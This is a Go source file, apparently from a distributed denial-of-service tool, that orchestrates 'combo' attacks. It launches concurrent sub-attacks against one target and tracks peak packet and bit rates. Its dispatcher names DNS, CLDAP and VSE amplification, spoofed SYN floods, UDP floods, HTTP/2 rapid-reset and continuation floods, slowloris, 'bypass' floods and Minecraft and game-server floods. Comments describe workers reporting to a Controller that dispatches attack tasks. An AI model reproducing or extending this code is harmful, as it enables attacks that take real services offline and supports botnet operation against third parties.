package attack

import (
	"sync"
	"sync/atomic"
	"time"
)

type ComboSession struct {
	Sessions []*AttackSession
	Stats    *AttackStats
	StopChan chan struct{}
	DoneChan chan struct{}
	stopped  int32
}

func NewComboSession(sessions []*AttackSession) *ComboSession {
	cs := &ComboSession{
		Sessions: sessions,
		Stats:    &AttackStats{StartTime: time.Now()},
		StopChan: make(chan struct{}),
		DoneChan: make(chan struct{}),
	}
	go cs.trackComboRates()
	go cs.watchCompletion()
	return cs
}

func (cs *ComboSession) Stop() {
	if atomic.CompareAndSwapInt32(&cs.stopped, 0, 1) {
		close(cs.StopChan)
		// 并行触发所有子攻击停止：串行 Stop 时每个最多等 5s，
		// N 个子攻击会让 worker 心跳主循环阻塞最长 5N 秒，
		// 直接导致 Controller 误判离线、任务被重复派发。
		for _, s := range cs.Sessions {
			s.finish()
		}
		var wg sync.WaitGroup
		for _, s := range cs.Sessions {
			wg.Add(1)
			go func(s *AttackSession) {
				defer wg.Done()
				select {
				case <-s.DoneChan:
				case <-time.After(5 * time.Second):
				}
			}(s)
		}
		wg.Wait()
	}
	// 最多等 5 秒，防止子攻击 goroutine 卡死时调用方被永久阻塞
	select {
	case <-cs.DoneChan:
	case <-time.After(5 * time.Second):
	}
}

func (cs *ComboSession) finish() {
	if atomic.CompareAndSwapInt32(&cs.stopped, 0, 1) {
		close(cs.StopChan)
	}
}

func (cs *ComboSession) watchCompletion() {
	var wg sync.WaitGroup
	for _, s := range cs.Sessions {
		wg.Add(1)
		go func(s *AttackSession) {
			defer wg.Done()
			<-s.DoneChan
		}(s)
	}
	// 超时兜底：子攻击个别卡死时不能让 combo 永不完成上报，
	// 否则 Controller 超时后重复派发攻击
	waitGroupTimeout(&wg, 5*time.Second)
	cs.finish()
	close(cs.DoneChan)
}

func (cs *ComboSession) trackComboRates() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			var totalPackets, totalBytes, totalPPS, totalBPS uint64
			for _, s := range cs.Sessions {
				totalPackets += atomic.LoadUint64(&s.Stats.PacketsSent)
				totalBytes += atomic.LoadUint64(&s.Stats.BytesSent)
				totalPPS += atomic.LoadUint64(&s.Stats.CurrentPPS)
				totalBPS += atomic.LoadUint64(&s.Stats.CurrentBPS)
			}
			atomic.StoreUint64(&cs.Stats.PacketsSent, totalPackets)
			atomic.StoreUint64(&cs.Stats.BytesSent, totalBytes)
			atomic.StoreUint64(&cs.Stats.CurrentPPS, totalPPS)
			atomic.StoreUint64(&cs.Stats.CurrentBPS, totalBPS)
			if totalPPS > atomic.LoadUint64(&cs.Stats.PeakPPS) {
				atomic.StoreUint64(&cs.Stats.PeakPPS, totalPPS)
			}
			if totalBPS > atomic.LoadUint64(&cs.Stats.PeakBPS) {
				atomic.StoreUint64(&cs.Stats.PeakBPS, totalBPS)
			}
		case <-cs.StopChan:
			return
		}
	}
}

func (cs *ComboSession) Snapshot() AttackSnapshot {
	// PacketsSent/BytesSent 直接对各子会话即时累加，避免用 cs.Stats 上被
	// trackComboRates 每秒刷新一次的滞后缓存值（与 Errors 保持同一时刻语义）。
	var totalPkts, totalBytes, totalErr uint64
	for _, s := range cs.Sessions {
		totalPkts += atomic.LoadUint64(&s.Stats.PacketsSent)
		totalBytes += atomic.LoadUint64(&s.Stats.BytesSent)
		totalErr += atomic.LoadUint64(&s.Stats.Errors)
	}
	return AttackSnapshot{
		PacketsSent: totalPkts,
		BytesSent:   totalBytes,
		Errors:      totalErr,
		PPS:         atomic.LoadUint64(&cs.Stats.CurrentPPS),
		BPS:         atomic.LoadUint64(&cs.Stats.CurrentBPS),
		PeakPPS:     atomic.LoadUint64(&cs.Stats.PeakPPS),
		PeakMbps:    float64(atomic.LoadUint64(&cs.Stats.PeakBPS)) * 8.0 / 1000000.0,
		Elapsed:     time.Since(cs.Stats.StartTime).Seconds(),
	}
}

// StartComboAttack 并发启动多个子攻击。子攻击的 Targets 由调用方按需填充
// （反射器子攻击带各自池，直接攻击子攻击留空以打向 Target）。
func StartComboAttack(cfg AttackConfig, subCfgs []AttackConfig) *ComboSession {
	sessions := make([]*AttackSession, 0, len(subCfgs))

	for _, sub := range subCfgs {
		sub.Target = cfg.Target
		sub.Duration = cfg.Duration

		session := subAttackMethodToFunc(sub)
		if session != nil {
			sessions = append(sessions, session)
		}
	}

	if len(sessions) == 0 {
		cs := &ComboSession{
			Sessions: sessions,
			Stats:    &AttackStats{StartTime: time.Now()},
			StopChan: make(chan struct{}),
			DoneChan: make(chan struct{}),
		}
		close(cs.DoneChan)
		return cs
	}

	return NewComboSession(sessions)
}

func subAttackMethodToFunc(cfg AttackConfig) *AttackSession {
	switch cfg.Method {
	case "vse":
		return StartVSEAttackEx(cfg)
	case "vse_reflector":
		return StartVSEAmplificationEx(cfg)
	case "dns_reflector":
		return StartDNSAmplificationEx(cfg)
	case "cldap_reflector":
		return StartCLDAPAmplificationEx(cfg)
	case "udp_stdhex", "udp_plain", "udp_bypass", "udp_burst":
		return StartUDPFloodEx(cfg)
	case "tcp_syn", "tcp_ack", "tcp_connect", "tcp_tcpbypass":
		return StartTCPFloodEx(cfg)
	case "tcp_syn_spoof":
		return StartSpoofedTCPFloodEx(cfg)
	case "http_flood":
		return StartHTTPFloodEx(cfg)
	case "head_flood":
		return StartHEADFloodEx(cfg)
	case "range_flood":
		return StartRangeFloodEx(cfg)
	case "post_flood":
		return StartPOSTFloodEx(cfg)
	case "http2_flood":
		return StartHTTP2FloodEx(cfg)
	case "http2_reset":
		return StartHTTP2ResetEx(cfg)
	case "http2_continuation":
		return StartHTTP2ContinuationEx(cfg)
	case "http2_bomb":
		return StartHTTP2BombEx(cfg)
	case "h2_ping":
		return StartH2PingEx(cfg)
	case "tls_handshake":
		return StartTLSHandshakeEx(cfg)
	case "slowloris", "slow_post":
		return StartSlowlorisEx(cfg)
	case "https_bypass":
		return StartHTTPSBypassEx(cfg)
	case "minecraft_handshake", "minecraft_login":
		return StartMinecraftAttackEx(cfg)
	case "game_udp":
		return StartGameUDPSpamEx(cfg)
	default:
		return nil
	}
}
